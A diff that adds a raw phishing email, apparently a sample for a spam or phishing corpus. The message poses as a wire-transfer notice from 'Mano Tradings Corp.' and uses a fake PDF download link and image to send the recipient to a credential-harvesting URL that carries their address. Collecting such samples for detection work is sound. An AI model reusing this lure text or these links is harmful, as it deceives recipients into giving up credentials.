@@ -1,0 +1,102 @@
+Received: from hj0.314.zrami.ml (unknown [67.205.170.232])
+	by app3 (Coremail) with SMTP id EDAi0gBHx8G_3ARgCF3OAA--.28328S3;
+	Mon, 18 Jan 2021 08:56:35 +0800 (CST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
+ d=314.zrami.ml;
+ h=Content-Type:MIME-Version:Subject:To:From:Date; i=manogroup@314.zrami.ml;
+ bh=LlEZhOKLdCeEi8N6jFKacyXmAk7SWTLJdrQ/cg2eseU=;
+ b=CmNJHPuINp7AV7+l6nKG/NxwYKn2XCh92MOGiVP3s3Cr43PDfeSaiLN+1Vlp3b9IoHZsUGDZFAZO
+   jSppITc2rH/r+f675QfNZqBr3YDtoSgWv9xjGMn9tL3ydq0t0+43L9Aa7HWHiu9PKS6ifuBDhEub
+   NfESzJTXAdPRjJCqv7c=
+Content-Type: multipart/alternative; boundary="===============0405912160=="
+MIME-Version: 1.0
+Subject: Payment Notifications!
+To: hhyang@test.com
+From: "Jim Nelson" <manogroup@314.zrami.ml>
+Date: Mon, 18 Jan 2021 01:02:30 -0800
+Sensitivity: Company-Confidential
+X-CM-TRANSID: EDAi0gBHx8G_3ARgCF3OAA--.28328S3
+Message-Id: <6004DCC8.0075C3.20145@test.com>
+Authentication-Results: app3; spf=pass smtp.mail=manogroup@314.zrami.m
+	l;
+X-Coremail-Antispam: 1UD129KBjDUn29KB7ZKAUJUUUUU529EdanIXcx71UUUUU7v73
+	VFW2AGmfu7bjvjm3AaLaJ3UjIYCTnIWjp_UUUOQ7k0a2IF6F1UM7kC6x804xWl14x267AK
+	xVWUJVW8JwAFIxvE14AKwVWUJVWUGwA2jI8I6cxK62vIxIIY0VWUZVW8XwA2ocxC64kIII
+	0Yj41l84x0c7CEw4AK67xGY2AK021l84ACjcxK6xIIjxv20xvE14v26r1j6r1xM28EF7xv
+	wVC0I7IYx2IY6xkF7I0E14v26r1j6r4UM28EF7xvwVC2z280aVAFwI0_Jr0_Gr1l84ACjc
+	xK6I8E87Iv6xkF7I0E14v26r1j6r4UM2AIxVAIcxkEcVAq07x20xvEncxIr21l5I8CrVAv
+	F7xS0VAEw40v6r43Mc02F40EY4x0e2IEc7I2Y4C_JFyl5I8CrVC2j2CE0s8v4I0Ex7kE8s
+	4l5I8CrVC2YI8G0VCIwI8vx48I8wAv7VC0I7IYx2IY67AKxVWUJVWUGwAv7VC2z280aVAF
+	wI0_Jr0_Gr1lOx8S6xCaFVCjc4AY6r1j6r4UM4x0Y48IcVAKI48JM4kEw2IEc2xF0cIa02
+	0Ex4CEFs1lw4CEF2IF47xS0VAv8wCjxxvEa2IrMxkI7II2jI8vz4vEwIxGrwCYIxAIcVC0
+	I7IYx2IY67AKxVWUJVWUCwCYIxAIcVC0I7IYx2IY6xkF7I0E14v26r1j6r4UMxvI42IY6I
+	8E87Iv67AKxVWUJVW8JwCYIxAIcVC2z280aVCY1x0267AKxVWUJVW8JwCF04k20xvY0x0E
+	wIxGrwCF72vE77IF4wCFx2IqxVCFs4IE7xkEbVWUJVW8JwC20s026c02F40E14v26r106r
+	1rMI8I3I0E7480Y4vE14v26r106r1rMI8E67AF67kF1VAFwI0_Jr0_JrylIxkGc2Ij64vI
+	r41lIxAIcVCF04k26cxKx2IYs7xG6rW3Jr0E3sUvcSsGvfC2KfnxnUUI43ZEXa7IUngVy3
+	UUUUU==
+
+You will not see this in a MIME-aware mail reader.
+--===============0405912160==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Please find attached copy of the wire transfer. Kindly let me know if this =
+is sufficient or if you need more information =
+
+
+Best Regards,
+
+Jim Nelson =
+
+
+Mano Tradings Corp.
+Tel: (631)757-0776
+Fax:(631)757-0798
+ =
+
+        =
+
+
+  =
+
+     PMTI000021.pdf- DOWNLOAD
+=20
+--===============0405912160==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head>
+<meta http-equiv=3D"Content-Language" content=3D"en-gb">
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
+1">
+<title>New Page 1</title>
+</head>
+
+<body><P>Please find attached copy of the wire transfer. Kindly let me know=
+ if this is sufficient or if you need more information <BR><BR>Best Regards=
+,<BR><BR>Jim Nelson <BR><BR>Mano Tradings Corp.<BR>Tel: (631)757-0776<BR>Fa=
+x:(631)757-0798</P>
+<TABLE style=3D"HEIGHT: 217px; WIDTH: 965px; TEXT-ALIGN: left" cellSpacing=
+=3D0 cellPadding=3D0 border=3D0>
+<TBODY>
+<TR>
+<TD>&nbsp;&nbsp; &nbsp; <A href=3D"https://onlineprint.actingservr.cf/page.=
+php?session=3Dhhyang@test.com"><IMG style=3D"BORDER-TOP: 0px solid; HEIGH=
+T: 272px; BORDER-RIGHT: 0px solid; WIDTH: 211px; BORDER-BOTTOM: 0px solid; =
+BORDER-LEFT: 0px solid" alt=3D"Pdf image" src=3D"http://svsrc.mzf.cz/stt.pn=
+g"></A><BR><BR>&nbsp;
+<TABLE style=3D"HEIGHT: 40px; WIDTH: 353px; TEXT-ALIGN: left; BACKGROUND-CO=
+LOR: white" cellSpacing=3D0 cellPadding=3D0 border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"BACKGROUND-COLOR: white">&nbsp; PMTI000021.pdf- <SMALL><A styl=
+e=3D"COLOR: rgb(0,0,102)" href=3D" https://onlineprint.actingservr.cf/page.=
+php?session=3Dhhyang@test.com"><SMALL><SPAN style=3D"TEXT-DECORATION: und=
+erline; FONT-WEIGHT: bold">DOWNLOAD</SPAN></SMALL></A></SMALL></TD></TR></T=
+BODY></TABLE>&nbsp;</TD></TR></TBODY></TABLE></BODY></HTML>
+--===============0405912160==--
